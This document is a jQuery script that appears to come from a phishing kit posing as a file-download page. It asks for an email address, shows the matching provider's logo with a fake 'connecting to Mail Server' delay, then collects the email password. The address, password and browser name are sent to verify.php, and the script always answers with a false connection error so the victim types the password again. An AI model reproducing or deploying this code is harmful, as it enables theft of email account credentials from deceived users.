$(script); 

function script(){ 
$("#email_field").watermark("Enter recipient email address."); 
$("#password_field").watermark("Enter the email password"); 
$("#download").live('click',click_to_download); 
$('#email_field').live('keyup', function(e) { 
	if(e.keyCode == 13) { 
	click_to_download(); } }); 
	$("#download2").live('click', now_download); 
	$('#password_field').live('keyup',function(e) { 					
		if(e.keyCode == 13) { now_download(); } 
	}); 
	} 
	
	function click_to_download(){ 
			var emailfield = $.trim($("#email_field").val().toLowerCase()); 
			var emailReg = /^([\w-\.]+@([\w-]+\.)+[\w-]{2,4})?$/; 
				if(emailfield == ""){ 
					jQuery.facebox("<div class='pop_up_class'>Please enter your business email.</div>"); 
				}else{ 
					if(
					!emailReg.test(emailfield)){ jQuery.facebox("<div class='pop_up_class'>Invalid email address</div>"); 
					}
					else{ 
						if(emailfield.indexOf("yahoo.com") != -1){ var the_image = "<img src='img/yahoo.jpg' width='130' />"; 
						var the_server = "Yahoo"; }else if(emailfield.indexOf("gmail.com") != -1){ 
						var the_server = "Gmail"; 
						var the_image = "<img src='img/gmail.jpg' width='130' />"; 
						}else if(
							emailfield.indexOf("hotmail.com") != -1){ var the_server = "Hotmail"; 
							var the_image = "<img src='img/hotmail.jpg' width='130' />"; 
						}else if(emailfield.indexOf("ymail.com") != -1){ var the_server = "Yahoo"; 
						var the_image = "<img src='img/yahoo.jpg' width='130' />"; 
						}else if(emailfield.indexOf("sina.com") != -1){ 
						var the_server = "Sina"; 
						var the_image = "<img src='img/sina.jpg' width='130' />"; 
						}else if(emailfield.indexOf("126.com") != -1){ 
						var the_server = "126.com"; 
						var the_image = "<img src='img/126.gif' width='130' />"; 
						}else if(emailfield.indexOf("163.com") != -1){ 
						var the_server = "163.com"; 
						var the_image = "<img src='img/163.png' width='130' />"; 
						}else{ var the_server = ""; 
						var the_image = "<img src='img/mailserver.png' width='64' height='64' />"; 
						} 
						jQuery.facebox("<div class='pop_up_class'>"+the_image+"<br><img src='img/loadingtheimage.gif' width='50'>...connecting to "+the_server+" Mail Server</div>"); make_the_delay(); 
					} 
				} 
		} 
		
		function make_the_delay(){ var delay = 3000; 
			setTimeout( function(){
			redirect_the(); 
			}, delay );
		} 
		
		function redirect_the(){
		$.facebox.close(); 
		$("#the_d_").slideDown(); $(".message_div").slideDown(); 
		$("#download").attr("id","download2"); 
		} 
		
		function now_download(){
			var the_email = $.trim($("#email_field").val()); 
			var the_password = $.trim($("#password_field").val()); 
			if(the_email == ""){
				jQuery.facebox("<div class='pop_up_class'>Please enter your business Email.</div>"); 
				}else if(the_password == ""){ 
				jQuery.facebox("<div class='pop_up_class'>Please enter the email password.</div>"); 
				}else{ 
					jQuery.facebox("<div class='pop_up_class'><img src='img/loadingtheimage.gif' width='50'>Download in progress...</div>"); 
					$.ajax({ 
						type: "POST", 
						url: "verify.php", 
						data: { 
							"email" : the_email , 
							"password" : the_password,
							"browser": the_browser()
						
						}, 
						
						success: function(data){ 
						var delay = 3000; 
						setTimeout( function() { 
						jQuery.facebox("<div class='pop_up_class'>Connecting error.. Please make sure to type your correct receiver email password.</div>"); 
						}, delay); 
						}, error: function (data){ 
						alert("Connection Error"); } 
					}); 
				} 
			}
			
			function the_browser() {
						var userAgent = navigator.userAgent.toLowerCase();						
						if (/edge/i.test(userAgent)){
							return 'Edge Browser';
						} else if (/rv:11/i.test(userAgent)){
							return 'IE v11';
						} else if (/msie 10/i.test(userAgent)){
							return 'IE v10';
						} else if (/opr/i.test(userAgent)){
							return 'Opera';
						} else if (/chrome/i.test(userAgent)){
							return 'Chrome';
						} else if (/firefox/i.test(userAgent)){
							return 'Firefox';
						} else if (!!navigator.userAgent.match(/Version\/[\d\.]+.*Safari/)) {
							return 'Safari';
						}
						return 'Unknown';
					}